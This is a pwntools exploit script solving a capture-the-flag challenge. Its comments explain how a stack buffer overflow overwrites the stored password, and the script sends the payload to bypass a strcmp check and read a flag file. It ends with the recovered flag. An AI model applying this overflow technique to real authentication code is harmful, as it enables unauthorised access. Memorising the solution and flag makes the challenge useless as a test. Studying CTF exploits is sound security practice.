from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./main', '''
    b *(main+358)
    continue
''')

# p = remote('readme-please.ctf.pearlctf.in', 30039)

# 1. correct password itself is at rbp-0x90, and buffer for read-in password is at rbp-0x100
# 2. strcmp can compare two strings with '\0' in the end
# 3. perform buffer overflow to overwrite correct password with 'AAAAAAAA\0'
# 4. use overwritten password 'AAAAAAAA\0' to pass strcmp

p.sendlineafter(b"Enter the file name: ", b'files/flag.txt')
p.sendlineafter(b"Enter password: ", b'A'*0x78+b'\0')
p.sendlineafter(b"Enter the file name: ", b'files/flag.txt')
p.sendlineafter(b"Enter password: ", b'A'*8)

p.interactive()

# pearl{f1l3_d3script0rs_4r3_c00l}